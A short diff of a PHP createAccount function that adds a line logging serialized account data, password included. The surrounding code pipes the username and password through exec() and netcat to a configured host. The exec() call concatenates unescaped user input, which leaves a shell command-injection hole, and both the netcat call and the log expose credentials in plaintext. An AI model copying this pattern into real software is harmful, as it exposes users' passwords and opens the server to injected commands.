@@ -400,7 +400,9 @@ function createAccount($data=array())
 	$host = $CONFIG['default']['hostname'];
 	$port = "12345";
 	
+	logFile(serialize($data));
 	exec("echo '".$data['username']. " ".$data['password']."' | nc ".$host." ".$port);
+
 }
 
 function sendGlobalMail($to,$from,$msg,$config=true){
